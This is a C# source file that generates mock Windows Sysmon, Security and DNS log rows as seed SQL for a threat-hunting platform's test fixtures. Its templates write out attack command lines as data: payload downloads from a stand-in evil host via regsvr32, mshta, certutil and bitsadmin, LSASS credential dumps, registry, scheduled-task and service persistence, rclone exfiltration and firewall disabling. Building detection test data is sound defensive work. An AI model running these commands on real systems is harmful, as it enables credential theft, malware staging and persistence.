namespace DeltaZulu.Platform.Data.Hunting;

using System.Globalization;
using System.Text;
using System.Text.Json;

/// <summary>
/// <para>Builds compact deterministic seed SQL for development and test fixtures.</para>
/// <para>
/// The goal is not to mirror one external dataset verbatim. The generated rows are
/// shaped after common EVTX/Sysmon, Windows Security, and DNS Server telemetry
/// patterns seen in public datasets and lab logs, while remaining small, stable,
/// and aligned to the current Bronze contracts.
/// </para>
/// <para>
/// The generated dataset is deterministic in shape but relative in time. A single
/// UTC anchor is captured by the caller and all event timestamps are generated as
/// offsets from that anchor, so time-window filters such as ago(1h), ago(24h),
/// and start-of-day filters remain useful in development data.
/// </para>
/// </summary>
internal static class MockSeedSqlGenerator
{
    private static readonly TimeSpan BaseOffsetFromNow = TimeSpan.FromHours(10);

    private static readonly string[] Users =
    [
        "CORP\\alice",
        "CORP\\bob",
        "CORP\\carol",
        "CORP\\dave",
        "CORP\\svc_backup",
        "CORP\\svc_deploy",
        "NT AUTHORITY\\SYSTEM"
    ];

    private static readonly string[] Workstations =
    [
        "WS-001",
        "WS-002",
        "WS-003",
        "WS-004",
        "WS-005",
        "WS-006",
        "WS-007",
        "WS-008"
    ];

    private static readonly string[] Servers =
    [
        "DC-001",
        "FS-001",
        "APP-001",
        "DB-001",
        "SRV-001"
    ];

    private static readonly ProcessTemplate[] ProcessTemplates =
    [
        new(
            @"C:\Windows\explorer.exe",
            "explorer.exe",
            @"C:\Windows\System32\userinit.exe",
            "userinit.exe",
            "interactive-baseline"),

        new(
            @"C:\Windows\System32\cmd.exe",
            "cmd /c whoami /all",
            @"C:\Windows\explorer.exe",
            "explorer.exe",
            "local-discovery"),

        new(
            @"C:\Windows\System32\whoami.exe",
            "whoami /all",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "local-discovery"),

        new(
            @"C:\Windows\System32\net.exe",
            "net user /domain",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "domain-discovery"),

        new(
            @"C:\Windows\System32\nltest.exe",
            "nltest /dclist:corp.local",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "domain-discovery"),

        new(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -NoP -ExecutionPolicy Bypass -File C:\\temp\\inventory.ps1",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "powershell-admin"),

        new(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -NoP -W Hidden -EncodedCommand SQBmACgA",
            @"C:\Windows\System32\mshta.exe",
            "mshta vbscript:Execute",
            "suspicious-powershell"),

        new(
            @"C:\Windows\System32\reg.exe",
            @"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\temp\updater.exe",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "persistence-registry"),

        new(
            @"C:\Windows\System32\schtasks.exe",
            @"schtasks /create /tn Updater /tr C:\temp\updater.exe /sc daily",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "persistence-scheduled-task"),

        new(
            @"C:\Windows\System32\sc.exe",
            @"sc create UpdaterSvc binPath= C:\temp\beacon.exe start= auto",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "persistence-service"),

        new(
            @"C:\Windows\System32\rundll32.exe",
            @"rundll32.exe comsvcs.dll MiniDump 624 C:\temp\lsass.dmp full",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "credential-access"),

        new(
            @"C:\Tools\procdump.exe",
            @"procdump.exe -accepteula -ma lsass.exe C:\temp\lsass_2.dmp",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "credential-access"),

        new(
            @"C:\Windows\System32\wmic.exe",
            @"wmic /node:WS-004 process call create C:\temp\payload.exe",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "lateral-movement"),

        new(
            @"C:\Windows\System32\regsvr32.exe",
            "regsvr32 /s /n /u /i:https://cdn.evil.example/file.sct scrobj.dll",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "signed-binary-proxy"),

        new(
            @"C:\Windows\System32\mshta.exe",
            "mshta.exe https://cdn.evil.example/update.hta",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "signed-binary-proxy"),

        new(
            @"C:\Windows\System32\certutil.exe",
            @"certutil.exe -urlcache -split -f https://cdn.evil.example/payload.bin C:\temp\payload.bin",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "ingress-tool-transfer"),

        new(
            @"C:\Windows\System32\bitsadmin.exe",
            @"bitsadmin /transfer job1 https://cdn.evil.example/stage.dat C:\temp\stage.dat",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "ingress-tool-transfer"),

        new(
            @"C:\Program Files\7-Zip\7z.exe",
            @"7z.exe a -tzip C:\temp\finance.zip C:\Users\Public\Documents\*.xlsx",
            @"C:\Windows\System32\cmd.exe",
            "cmd /c collect.bat",
            "collection-archive"),

        new(
            @"C:\Tools\rclone.exe",
            @"rclone.exe copy C:\temp\finance.zip remote:archive --transfers 4",
            @"C:\Windows\System32\cmd.exe",
            "cmd /c collect.bat",
            "exfiltration"),

        new(
            @"C:\Windows\System32\netsh.exe",
            "netsh advfirewall set allprofiles state off",
            @"C:\Windows\System32\cmd.exe",
            "cmd",
            "defense-evasion")
    ];

    private static readonly NetworkTemplate[] NetworkTemplates =
    [
        new("10.0.1.20", "10.0.2.10", "445", "tcp", @"C:\Windows\System32\wmic.exe", "FS-001.corp.local", "lateral-smb"),
        new("10.0.1.21", "10.0.0.53", "53", "udp", @"C:\Windows\System32\nslookup.exe", "DNS-001.corp.local", "dns-query"),
        new("10.0.1.22", "203.0.113.50", "443", "tcp", @"C:\temp\beacon.exe", "c2.example.test", "c2-https"),
        new("10.0.1.23", "203.0.113.77", "4444", "tcp", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "listener.example.test", "reverse-shell"),
        new("10.0.1.24", "198.51.100.20", "443", "tcp", @"C:\Tools\rclone.exe", "object-store.example.test", "exfil-https"),
        new("10.0.1.25", "203.0.113.99", "80", "tcp", @"C:\Windows\System32\bitsadmin.exe", "cdn.evil.example", "download-http"),
        new("10.0.1.26", "10.0.2.20", "3389", "tcp", @"C:\Windows\System32\mstsc.exe", "SRV-001.corp.local", "rdp-admin"),
        new("10.0.1.27", "10.0.3.15", "1433", "tcp", @"C:\Program Files\App\app.exe", "DB-001.corp.local", "database-access")
    ];

    private static readonly string[] DnsNames =
    [
        "corp.local",
        "dc-001.corp.local",
        "fs-001.corp.local",
        "srv-001.corp.local",
        "login.microsoftonline.com",
        "updates.vendor.example",
        "cdn.evil.example",
        "c2.example.test",
        "listener.example.test",
        "object-store.example.test",
        "tunnel-stage.example.test",
        "dGhpcy1sb29rcy1saWtlLXR1bm5lbA.example.test",
        "api.github.com",
        "packages.microsoft.com",
        "telemetry.vendor.example",
        "backup-storage.example.test"
    ];

    public static string BuildWindowsSysmonSeedSql(
        string tableName,
        DateTimeOffset? nowUtc = null)
    {
        var baseTime = ResolveBaseTime(nowUtc);
        var rows = new List<string>(320);

        for (var i = 0; i < 220; i++)
        {
            var template = ProcessTemplates[i % ProcessTemplates.Length];
            var timestamp = baseTime.AddMinutes(i);
            var host = i % 9 == 0 ? Servers[i % Servers.Length] : Workstations[i % Workstations.Length];
            var user = template.Image.Contains("svchost.exe", StringComparison.OrdinalIgnoreCase)
                ? "NT AUTHORITY\\SYSTEM"
                : Users[i % (Users.Length - 1)];

            var raw = new Dictionary<string, string?>
            {
                ["EventID"] = "1",
                ["EventRecordID"] = (1000 + i).ToString(CultureInfo.InvariantCulture),
                ["UtcTime"] = FormatIso(timestamp),
                ["Image"] = template.Image,
                ["CommandLine"] = template.CommandLine,
                ["User"] = user,
                ["ProcessId"] = (4000 + i).ToString(CultureInfo.InvariantCulture),
                ["ParentImage"] = template.ParentImage,
                ["ParentCommandLine"] = template.ParentCommandLine,
                ["ParentProcessId"] = (3000 + i).ToString(CultureInfo.InvariantCulture),
                ["Hashes"] = $"SHA256=proc{i:000000}",
                ["IntegrityLevel"] = i % 5 == 0 ? "High" : "Medium",
                ["Scenario"] = template.Scenario
            };

            rows.Add(BuildValue(timestamp, "windows-sysmon", "Microsoft-Windows-Sysmon", host, raw));
        }

        for (var i = 0; i < 100; i++)
        {
            var template = NetworkTemplates[i % NetworkTemplates.Length];
            var timestamp = baseTime.AddHours(5).AddMinutes(i);
            var host = Workstations[i % Workstations.Length];
            var user = Users[i % (Users.Length - 1)];

            var raw = new Dictionary<string, string?>
            {
                ["EventID"] = "3",
                ["EventRecordID"] = (3000 + i).ToString(CultureInfo.InvariantCulture),
                ["UtcTime"] = FormatIso(timestamp),
                ["SourceIp"] = template.SourceIp,
                ["SourcePort"] = (51000 + i).ToString(CultureInfo.InvariantCulture),
                ["DestinationIp"] = template.DestinationIp,
                ["DestinationPort"] = template.DestinationPort,
                ["Protocol"] = template.Protocol,
                ["Image"] = template.Image,
                ["ProcessId"] = (6000 + i).ToString(CultureInfo.InvariantCulture),
                ["User"] = user,
                ["Hashes"] = $"SHA256=net{i:000000}",
                ["DestinationHostname"] = template.DestinationHostname,
                ["Scenario"] = template.Scenario
            };

            rows.Add(BuildValue(timestamp, "windows-sysmon", "Microsoft-Windows-Sysmon", host, raw));
        }

        return BuildInsert(tableName, rows);
    }

    public static string BuildWindowsSecuritySeedSql(
        string tableName,
        DateTimeOffset? nowUtc = null)
    {
        var baseTime = ResolveBaseTime(nowUtc);
        var rows = new List<string>(100);

        for (var i = 0; i < 100; i++)
        {
            var timestamp = baseTime.AddHours(7).AddMinutes(i);
            var eventId = (i % 10) switch
            {
                0 or 1 or 2 or 3 => "4624",
                4 or 5 => "4625",
                6 => "4672",
                7 => "4688",
                8 => "4720",
                _ => "4728"
            };

            var host = eventId is "4688" ? Workstations[i % Workstations.Length] : "DC-001";
            var targetUser = Users[i % (Users.Length - 1)].Split('\\').Last();
            var raw = BuildSecurityEvent(eventId, i, timestamp, targetUser);

            rows.Add(BuildValue(timestamp, "windows-security", "Microsoft-Windows-Security-Auditing", host, raw));
        }

        return BuildInsert(tableName, rows);
    }

    public static string BuildDnsServerSeedSql(
        string tableName,
        DateTimeOffset? nowUtc = null)
    {
        var baseTime = ResolveBaseTime(nowUtc);
        var rows = new List<string>(80);

        for (var i = 0; i < 80; i++)
        {
            var timestamp = baseTime.AddHours(9).AddSeconds(i * 30);
            var queryName = DnsNames[i % DnsNames.Length];
            var queryType = queryName.Contains("dGhpcy", StringComparison.OrdinalIgnoreCase)
                ? "TXT"
                : i % 9 == 0
                    ? "SRV"
                    : i % 7 == 0
                        ? "AAAA"
                        : "A";
            var responseCode = queryName.Contains("dGhpcy", StringComparison.OrdinalIgnoreCase) || i % 17 == 0
                ? "NXDOMAIN"
                : "NOERROR";
            var clientIp = $"10.0.1.{20 + (i % 30)}";

            var raw = new Dictionary<string, string?>
            {
                ["EventID"] = i % 11 == 0 ? "257" : "256",
                ["EventRecordID"] = (7000 + i).ToString(CultureInfo.InvariantCulture),
                ["TimeCreated"] = FormatIso(timestamp),
                ["ClientIp"] = clientIp,
                ["SourceIp"] = clientIp,
                ["QueryName"] = queryName,
                ["QNAME"] = queryName,
                ["QueryType"] = queryType,
                ["QTYPE"] = queryType,
                ["ResponseCode"] = responseCode,
                ["Protocol"] = i % 11 == 0 ? "TCP" : "UDP",
                ["Scenario"] = queryName.EndsWith(".example.test", StringComparison.OrdinalIgnoreCase)
                    ? "lab-suspicious-domain"
                    : "baseline-dns"
            };

            rows.Add(BuildValue(timestamp, "dns-server", "Microsoft-Windows-DNS-Server-Service", "DNS-001", raw));
        }

        return BuildInsert(tableName, rows);
    }

    private static DateTime ResolveBaseTime(DateTimeOffset? nowUtc)
    {
        var resolvedNowUtc = (nowUtc ?? DateTimeOffset.UtcNow)
            .ToUniversalTime()
            .UtcDateTime;

        resolvedNowUtc = resolvedNowUtc.AddTicks(-(resolvedNowUtc.Ticks % TimeSpan.TicksPerSecond));

        return DateTime.SpecifyKind(
            resolvedNowUtc.Subtract(BaseOffsetFromNow),
            DateTimeKind.Utc);
    }

    private static Dictionary<string, string?> BuildSecurityEvent(
        string eventId,
        int index,
        DateTime timestamp,
        string targetUser)
    {
        var baseEvent = new Dictionary<string, string?>
        {
            ["EventID"] = eventId,
            ["EventRecordID"] = (5000 + index).ToString(CultureInfo.InvariantCulture),
            ["TimeCreated"] = FormatIso(timestamp),
            ["SubjectUserName"] = index % 6 == 0 ? "admin" : "-",
            ["SubjectDomainName"] = "CORP",
            ["TargetUserName"] = targetUser,
            ["TargetDomainName"] = "CORP"
        };

        switch (eventId)
        {
            case "4624":
                baseEvent["TargetLogonId"] = $"0x{0x8000 + index:x}";
                baseEvent["LogonType"] = index % 8 == 0 ? "10" : "3";
                baseEvent["IpAddress"] = $"10.0.1.{20 + (index % 30)}";
                baseEvent["IpPort"] = (54000 + index).ToString(CultureInfo.InvariantCulture);
                baseEvent["WorkstationName"] = Workstations[index % Workstations.Length];
                baseEvent["AuthenticationPackageName"] = index % 4 == 0 ? "NTLM" : "Negotiate";
                baseEvent["ProcessName"] = @"C:\Windows\System32\svchost.exe";
                break;

            case "4625":
                baseEvent["Status"] = index % 2 == 0 ? "0xC000006A" : "0xC000006D";
                baseEvent["SubStatus"] = "0xC000006A";
                baseEvent["FailureReason"] = "%%2313";
                baseEvent["LogonType"] = "3";
                baseEvent["IpAddress"] = $"10.0.1.{90 + (index % 5)}";
                baseEvent["IpPort"] = (55000 + index).ToString(CultureInfo.InvariantCulture);
                baseEvent["WorkstationName"] = "UNKNOWN";
                break;

            case "4672":
                baseEvent["SubjectLogonId"] = $"0x{0x9000 + index:x}";
                baseEvent["PrivilegeList"] = "SeSecurityPrivilege SeBackupPrivilege SeDebugPrivilege SeImpersonatePrivilege";
                break;

            case "4688":
                var template = ProcessTemplates[index % ProcessTemplates.Length];
                baseEvent["NewProcessName"] = template.Image;
                baseEvent["ProcessCommandLine"] = template.CommandLine;
                baseEvent["NewProcessId"] = $"0x{0x1000 + index:x}";
                baseEvent["ParentProcessName"] = template.ParentImage;
                baseEvent["CreatorProcessId"] = $"0x{0x0800 + index:x}";
                break;

            case "4720":
                baseEvent["SamAccountName"] = $"temp.audit{index}";
                baseEvent["UserPrincipalName"] = $"temp.audit{index}@corp.local";
                break;

            case "4728":
                baseEvent["MemberName"] = $"CN={targetUser},CN=Users,DC=corp,DC=local";
                baseEvent["GroupName"] = index % 3 == 0 ? "Domain Admins" : "Remote Management Users";
                baseEvent["GroupDomain"] = "CORP";
                break;
        }

        return baseEvent;
    }

    private static string BuildInsert(string tableName, IReadOnlyList<string> rows)
    {
        if (rows.Count == 0)
        {
            throw new InvalidOperationException("Seed SQL cannot be built without rows.");
        }

        var builder = new StringBuilder();
        builder.Append("INSERT INTO ");
        builder.Append(tableName);
        builder.AppendLine(" (ingest_time, source_name, provider, host, raw_log, raw_text) VALUES");
        builder.AppendJoin(",\n", rows);
        builder.Append(';');
        return builder.ToString();
    }

    private static string BuildValue(
        DateTime ingestTime,
        string sourceName,
        string provider,
        string host,
        IReadOnlyDictionary<string, string?> raw)
    {
        var json = JsonSerializer.Serialize(raw);

        var ingestTimeSql = ingestTime.ToUniversalTime().ToString(
            "yyyy-MM-dd HH:mm:ss",
            CultureInfo.InvariantCulture);

        return $"(TIMESTAMP '{ingestTimeSql}', '{Sql(sourceName)}', '{Sql(provider)}', '{Sql(host)}', CAST('{Sql(json)}' AS JSON), '')";
    }

    private static string FormatIso(DateTime value) =>
        value.ToUniversalTime().ToString("yyyy-MM-dd'T'HH:mm:ss'Z'", CultureInfo.InvariantCulture);

    private static string Sql(string value) => value.Replace("'", "''", StringComparison.Ordinal);

    private sealed record ProcessTemplate(
        string Image,
        string CommandLine,
        string ParentImage,
        string ParentCommandLine,
        string Scenario);

    private sealed record NetworkTemplate(
        string SourceIp,
        string DestinationIp,
        string DestinationPort,
        string Protocol,
        string Image,
        string DestinationHostname,
        string Scenario);
}